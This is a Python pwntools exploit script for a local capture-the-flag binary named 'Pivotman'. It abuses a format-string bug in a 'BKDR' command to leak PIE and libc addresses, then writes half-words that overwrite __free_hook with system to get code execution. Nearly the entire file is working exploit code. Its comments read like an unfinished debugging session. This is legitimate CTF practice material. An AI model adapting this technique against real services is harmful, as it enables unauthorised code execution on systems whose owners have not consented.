#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'

CHALL_DIR = '/home/gluppler/Downloads/CTFs-Testing/Pwn/Easy/Pivotman/pwn_pivotman/challenge'
ELF_PATH = f'{CHALL_DIR}/chall'
LD_PATH = f'{CHALL_DIR}/ld-linux-x86-64.so.2'
LIBC_PATH = f'{CHALL_DIR}/libc.so.6'

libc = ELF(LIBC_PATH, checksec=False)

p = process([LD_PATH, ELF_PATH], cwd=CHALL_DIR)
p.recvuntil(b' \r\n', timeout=10)
p.sendline(b'USER ;)')
p.recvuntil(b' \r\n')
p.sendline(b'PASS ;)')
p.recvuntil(b' \r\n')

# Leak PIE + saved_rbp
p.sendline(b'BKDR %2737$p.%2736$p')
resp = p.recvuntil(b' \r\n')
marker = b' BKDR '
idx = resp.find(marker)
after = resp[idx + len(marker):]
parts = after.split(b'.')
pie_base = int(parts[0], 16) - 0x3a10
saved_rbp = int(parts[1], 16)
log.info(f'PIE: {hex(pie_base)}, saved_rbp: {hex(saved_rbp)}')

# Leak libc
puts_got = pie_base + 0x5ed8
payload = b'BKDR ' + b'%1032$sA' + p64(puts_got)
p.sendline(payload)
data = p.recvuntil(b'A', timeout=5)
idx = data.find(b' BKDR ')
leaked = data[idx + 6:-1]
puts_addr = u64(leaked[:8].ljust(8, b'\x00'))
libc_base = puts_addr - libc.symbols['puts']
log.info(f'libc base: {hex(libc_base)}')

free_hook = libc_base + libc.symbols['__free_hook']
system_addr = libc_base + libc.symbols['system']
log.info(f'free_hook: {hex(free_hook)}, system: {hex(system_addr)}')

# Build writes manually (no sort by value - keep address order)
hw_writes = []
for j in range(4):
    hw_addr = free_hook + j * 2
    hw_val = (system_addr >> (j * 16)) & 0xffff
    hw_writes.append((hw_addr, hw_val))

# Keep them in address order (not sorted by value)
# addr order: +0, +2, +4, +6
# But pwntools sorts by value. Let me do it unsorted for simplicity

# For minimal output, overwrite only 3 half-words (lower 6 bytes of system)
# The top 2 bytes are 0x0000 which __free_hook should already have
# Only write 3 half-words: +0, +2, +4 (6 bytes total, enough for typical libc addr)
hw_writes = hw_writes[:3]  # just bytes 0-5, byte 6-7 are 0 already

# Build payload: keep addrs at end, specs in order of processing
# Use small deltas to minimize output

# Build fmt specifiers one at a time, tracking position
current = 0
fmt = b''
addrs = b''

# We need: for each addr, spec like %Xc%Y$hn
# where X = (val - current) % 65536, and Y = position of addr

# First, build addrs and estimate positions
for addr, val in hw_writes:
    addrs += p64(addr)

# Estimate: fmt before addrs is roughly 15 bytes per write = 45 bytes  
# plus "BKDR " = 5 bytes
# plus padding
est_fmt = 45
padding = (8 - (3 + 5 + est_fmt) % 8) % 8
addr_start = 3 + 5 + est_fmt + padding
log.info(f'Addr start at buffer offset: {addr_start}')

# Build proper fmt
current = 0
fmt = b''
for idx, (addr, val) in enumerate(hw_writes):
    pos = 1030 + (addr_start // 8) + idx
    delta = (val - current) % 0x10000
    if delta == 0:
        delta = 1
        spec = f'%1c%{pos}$hn'.encode()
    else:
        spec = f'%{delta}c%{pos}$hn'.encode()
    fmt += spec
    current = val

# Re-pad and rebuild
padding = (8 - (3 + 5 + len(fmt)) % 8) % 8
fmt += b'.' * padding

# Recalculate positions
actual_addr_start = 3 + 5 + len(fmt)
log.info(f'Actual addr start: {actual_addr_start} (aligned: {actual_addr_start % 8 == 0})')

current = 0
fmt = b''
for idx, (addr, val) in enumerate(hw_writes):
    pos = 1030 + (actual_addr_start // 8) + idx
    delta = (val - current) % 0x10000
    if delta == 0:
        delta = 1
    spec = f'%{delta}c%{pos}$hn'.encode()
    fmt += spec
    current = val

padding = (8 - (3 + 5 + len(fmt)) % 8) % 8
fmt += b'.' * padding

final = b'BKDR ' + fmt + addrs

log.info(f'Final payload: {len(final)} bytes')
log.info(f'Fmt part: {fmt[:100]}')
log.info(f'Addr part ({len(addrs)} bytes): {addrs.hex()}')

# Check total chars printed
total_chars = 0
for idx, (addr, val) in enumerate(hw_writes):
    pos = 1030 + (actual_addr_start // 8) + idx
    delta = (val - total_chars) % 0x10000
    if delta == 0:
        delta = 1
    log.info(f'  Write {idx}: {hex(addr)} <- {hex(val)}, pos={pos}, delta={delta}')
    total_chars = val

log.info(f'Total chars to output: {total_chars}')

# Send the payload
p.sendline(final)

# Read the response (may be large due to %c)
try:
    # First try to get all output
    resp = p.recv(timeout=5)
    log.info(f'Response size: {len(resp)} bytes')
    # Check if program is still alive
    p.sendline(b'TEST')
    resp2 = p.recv(timeout=2)
    log.info(f'Test response: {resp2[:200]}')
except EOFError:
    log.error('Program crashed!')
except:
    log.error('Timeout')

p.close()
